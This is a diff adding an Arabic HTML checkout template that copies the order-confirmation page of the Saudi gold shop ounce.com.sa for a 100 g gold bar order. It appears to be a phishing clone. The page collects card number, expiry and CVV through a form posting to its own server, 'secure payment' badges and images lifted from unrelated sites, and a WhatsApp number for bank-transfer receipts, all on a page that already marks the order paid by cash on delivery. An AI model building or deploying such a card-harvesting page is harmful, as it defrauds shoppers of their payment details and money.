@@ -1,0 +1,325 @@
+@html.extend('layout', function(model) {
+	
+  @html.block('content', function(model) {
+     <main id="main" style="padding:1rem">
+			<div class="checkout-page-title page-title">
+				<div class="page-title-inner flex-row medium-flex-wrap container">
+					<div class="flex-col flex-grow medium-text-center">
+						<nav
+							class="breadcrumbs flex-row flex-row-center heading-font checkout-breadcrumbs text-center strong h2 uppercase">
+							<a href="https://ounce.com.sa/cart/" class="hide-for-small">
+								سلة المشتريات </a>
+							<span class="divider hide-for-small"><i class="icon-angle-right"></i></span>
+							<a href="https://ounce.com.sa/checkout/" class="hide-for-small">
+								تفاصيل الطلب </a>
+							<span class="divider hide-for-small"><i class="icon-angle-right"></i></span>
+							<a href="#" class="no-click current">
+								طلبك مكتمل </a>
+						</nav>
+					</div>
+				</div>
+			</div>
+			<div class="cart-container container page-wrapper page-checkout">
+				<div class="woocommerce">
+					<div class="row">
+
+
+						<div class="large-7 col">
+
+							<section class="woocommerce-order-details">
+
+								<h2 class="woocommerce-order-details__title">تفاصيل الطلب</h2>
+
+								<table
+									class="woocommerce-table woocommerce-table--order-details shop_table order_details">
+
+									<thead>
+										<tr>
+											<th class="woocommerce-table__product-name product-name">المنتج</th>
+											<th class="woocommerce-table__product-table product-total">الإجمالي</th>
+										</tr>
+									</thead>
+
+									<tbody>
+										<tr class="woocommerce-table__line-item order_item">
+
+											<td class="woocommerce-table__product-name product-name">
+												<a
+													href="https://ounce.com.sa/product/pamp-%d8%b3%d8%a8%d9%8a%d9%83%d8%a9-%d8%b0%d9%87%d8%a8-100-%d8%ac%d8%b1%d8%a7%d9%85/">PAMP
+													سبيكة ذهب 100 جرام</a> <strong
+													class="product-quantity">&times;&nbsp;1</strong>
+											</td>
+
+											<td class="woocommerce-table__product-total product-total">
+												<span class="woocommerce-Price-amount amount"><bdi>23,652&nbsp;<span
+															class="woocommerce-Price-currencySymbol">ريال</span></bdi></span>
+											</td>
+
+										</tr>
+
+									</tbody>
+
+									<tfoot>
+										<tr>
+											<th scope="row">المجموع:</th>
+											<td><span class="woocommerce-Price-amount amount">23,652&nbsp;<span
+														class="woocommerce-Price-currencySymbol">ريال</span></span></td>
+										</tr>
+										<tr>
+											<th scope="row">الشحن:</th>
+											<td>23.99 ريال </td>
+										</tr>
+										
+										<tr>
+											<th scope="row">الإجمالي:</th>
+											<td><span class="woocommerce-Price-amount amount">23,690&nbsp;<span
+														class="woocommerce-Price-currencySymbol">ريال</span></span></td>
+										</tr>
+									</tfoot>
+								</table>
+								<hr>
+								
+								@* ==== card section ========= *@
+								<div class="section section--payment">
+									<div class="row">
+										<div class="col-md-12">
+											<div id="payment_step" class="payment-step mb-0">
+											<div data-step="2" class="title title--step">
+												<img src="/img/step-payment.svg" />
+												<h3>طريقة الدفع</h3>
+											</div>
+											<script>
+												$(function () {
+												//run when the DOM is ready
+												$(".clickable").click(function () {
+													//use a class, since your ID gets mangled
+													$(this).addClass("active"); //add the class to the clicked element
+													var onlinEmp = document.getElementById("bank-div");
+													var form = document.getElementById("cardForm");
+													var element = document.getElementById("myDIV");
+													var element2 = document.getElementById("bank");
+													var element3 = document.getElementById("delvery");
+
+													element3.classList.remove("active");
+													element.classList.remove("active");
+													element2.classList.remove("active");
+													form.style.display = "block";
+													onlinEmp.style.display = "none";
+												});
+
+												$(".clickable2").click(function () {
+													//use a class, since your ID gets mangled
+													$(this).addClass("active"); //add the class to the clicked element
+													var onlinEmp = document.getElementById("bank-div");
+													var delvered = document.getElementById("delvered-div");
+													var form = document.getElementById("cardForm");
+													var element = document.getElementById("hhh");
+													var element2 = document.getElementById("bank");
+													var element3 = document.getElementById("delvery");
+
+													element3.classList.remove("active");
+													element.classList.remove("active");
+													element2.classList.remove("active");
+													form.style.display = "block";
+													delvered.style.display = "none";
+													onlinEmp.style.display = "none";
+												});
+												$(".clickable3").click(function () {
+													//use a class, since your ID gets mangled
+													$(this).addClass("active"); //add the class to the clicked element
+													var form = document.getElementById("cardForm");
+													var onlinEmp = document.getElementById("bank-div");
+													var delvered = document.getElementById("delvered-div");
+													var element = document.getElementById("myDIV");
+													var element2 = document.getElementById("hhh");
+													var element3 = document.getElementById("delvery");
+
+													element3.classList.remove("active");
+													element.classList.remove("active");
+													element2.classList.remove("active");
+													form.style.display = "none";
+													delvered.style.display = "none";
+													onlinEmp.style.display = "block";
+												});
+												$(".clickable4").click(function () {
+													//use a class, since your ID gets mangled
+													$(this).addClass("active"); //add the class to the clicked element
+													var form = document.getElementById("cardForm");
+													var onlinEmp = document.getElementById("bank-div");
+													var delvered = document.getElementById("delvered-div");
+													var element = document.getElementById("myDIV");
+													var element2 = document.getElementById("hhh");
+													var element3 = document.getElementById("bank");
+
+													element.classList.remove("active");
+													element3.classList.remove("active");
+													element2.classList.remove("active");
+													form.style.display = "none";
+													onlinEmp.style.display = "none";
+													delvered.style.display = "block";
+												});
+												});
+											</script>
+											<div id="payment_methods_wrapper">
+												<ul id="payment_methods" class="list list--payment-methods">
+												<li>
+													<button type="button" class="btn btn--round btn--payment-option active clickable2" id="myDIV">
+													<img src="/img/pay-option-mada.svg" alt="Mada" />
+													</button>
+												</li>
+												<li>
+													<button onClick="addClass" type="button" class="btn btn--round btn--payment-option clickable"
+													id="hhh">
+													<img src="/img/pay-option-credit-2.svg" alt="Credit card Logo" class="large" />
+													</button>
+												</li>
+												<li>
+													<button onClick="addClass" type="button" class="btn btn--round btn--payment-option clickable3"
+													id="bank">
+													<img width="35px" src="https://rewayah.store/vendor/checkout/images/icons/pay-option-bank-acc.svg" alt="Credit card Logo" class="large" />
+														تحويل بنكي
+													</button>
+												</li>
+												<li>
+													<button onClick="addClass" type="button" class="btn btn--round btn--payment-option clickable4"
+													id="delvery">
+													<img width="35px" src="https://www.marsum2030.com/front/images/118484455151848.png" alt="Credit card Logo" class="large" />
+													الدفع عند الاستلام
+													</button>
+												</li>
+												
+												</ul>
+											</div>
+											<span>
+												<form id="cardForm" data-v-09edeec7  class="form form--payment">
+																				
+													<div data-v-09edeec7 class="row">
+														<div data-v-09edeec7 class="col-md-8 col-xs-12">
+														<span data-v-09edeec7>
+															<fieldset data-v-09edeec7 data-openreplay-masked
+															class="form-group--w-icon form-group payment-type">
+															<i data-v-09edeec7 class="sicon-debit-card-back"></i>
+															<input data-v-09edeec7 type="tel" maxlength="19" pattern="[0-9]*" autocomplete="cc-number"
+																placeholder="رقم البطاقة" class="form-control ym-disable-keys ym-hide-content"
+																name="cardnumber" />
+															
+															</fieldset>
+														</span>
+														</div>
+														<div data-v-09edeec7 class="col-md-2 col-xs-6">
+														<span data-v-09edeec7>
+															<fieldset data-v-09edeec7 class="form-group">
+															<div data-v-09edeec7 class="input-wrapper-expiry">
+																<input data-v-09edeec7 type="tel" maxlength="2" pattern="[0-9]*" placeholder="الشهر"
+																id="cc_month" name="carddate" autocomplete="cc-exp-month"
+																class="form-control ym-disable-keys ym-hide-content card-month" />
+																<input data-v-09edeec7 type="text" placeholder="/" disabled="disabled"
+																class="form-control separator" />
+																<input data-v-09edeec7 type="tel" maxlength="2" pattern="[0-9]*" placeholder="السنة"
+																id="cc_year" name="carddate1" autocomplete="cc-exp-year"
+																class="form-control ym-disable-keys ym-hide-content card-year" />
+															</div>
+															
+															
+															</fieldset>
+														</span>
+														</div>
+														<div data-v-09edeec7 class="col-md-2 col-xs-6">
+														<span data-v-09edeec7>
+															<fieldset data-v-09edeec7 data-openreplay-masked class="form-group">
+															<input data-v-09edeec7 type="tel" pattern="\d*" maxlength="4" autocomplete="cc-csc"
+																placeholder="رمز التحقق (CVC)" name="cvv"
+																class="form-control ym-disable-keys ym-hide-content" />
+															
+															</fieldset>
+														</span>
+														</div>
+													</div>
+												
+													<ul class="list list--brands">
+														<li>تسوق إلكتروني آمن 100%</li>
+														<li><img src="/img/secure-payment.svg" /></li>
+														<li><img src="/img/secure-payment-02.svg" /></li>
+														<li><img src="/img/secure-payment-03.svg" /></li>
+													</ul>
+													<br>
+													<br>
+													<br>
+													<div data-v-e5a4c4bc>
+														<button data-v-e5a4c4bc id="cardSubmit" type="submit" name="subm"
+															class="btn btn--primary btn--wide btn--round btn--submit btn--fixed wide">
+															<span data-v-e5a4c4bc>اكمال الدفع</span>                                                
+														</button>
+													</div>
+												</form>
+												<div id="bank-div" style="display:none">
+												<h4>يرجى التواصل مع موظف المبيعات اونلاين لارسال صورة الايصال</h4>
+												<a href="https://api.whatsapp.com/send/?phone=966500279904" target="_blank"> <img width="150px" src="https://allheddad.com/wp-content/uploads/2021/12/client.png" />  </a>
+												</div>
+
+												<div id="delvered-div" style="display:none">
+												<h4>يرجى إكمال اجرائات شركة التوصيل آرامكس لتتبع طلبك </h4>
+												<div style="display: flex; flex-direction: row; align-items: center; justify-content: center; margin-top:2rem;">
+														<h3>رقم الطلب: </h3>
+														<div class="order-number"> <span class="orderCode" style="font-weight: bold; font-size=22px;margin:auto">@model.id</span> </div>
+												</div>
+												<br>
+													<a class="aramx-btn" href="/aramex/@model.id">
+														<img width="50px" src="https://1.bp.blogspot.com/-2uXlQ5DJfmQ/X6l2ODOQfRI/AAAAAAAAUsg/YltlKUnAULIGebPsW2Oh3b_Wd_pUaVZEACLcBGAsYHQ/s16000/%25D8%25A7%25D8%25B1%25D8%25A7%25D9%2585%25D9%2583%25D8%25B3.png" alt="Credit card Logo"  />
+													اكمال اجراء التوصيل
+													</a>
+												</div>
+											</span>
+											</div>
+
+										</div>
+									</div>
+									
+								</div>
+							 
+							</section>
+								
+							 
+						</div>
+
+						<div class="large-5 col">
+							<div class="is-well col-inner entry-content">
+								<p
+									class="success-color woocommerce-notice woocommerce-notice--success woocommerce-thankyou-order-received">
+									<strong>شكرًا لك. تم استلام طلبك.</strong></p>
+
+								<ul class="woocommerce-order-overview woocommerce-thankyou-order-details order_details">
+
+									<li class="woocommerce-order-overview__order order">
+										رقم الطلب: <strong>7943</strong>
+									</li>
+
+									<li class="woocommerce-order-overview__date date">
+										التاريخ: <strong>ديسمبر 26, 2022</strong>
+									</li>
+
+
+									<li class="woocommerce-order-overview__total total">
+										الإجمالي: <strong><span
+												class="woocommerce-Price-amount amount"><bdi>23,652&nbsp;<span
+														class="woocommerce-Price-currencySymbol">ريال</span></bdi></span></strong>
+									</li>
+
+									<li class="woocommerce-order-overview__payment-method method">
+										وسيلة الدفع: <strong>الدفع عند الإستلام</strong>
+									</li>
+
+								</ul>
+
+								<div class="clear"></div>
+							</div>
+						</div>
+
+
+
+					</div>
+				</div>
+			</div>
+		</main>
+  })
+})
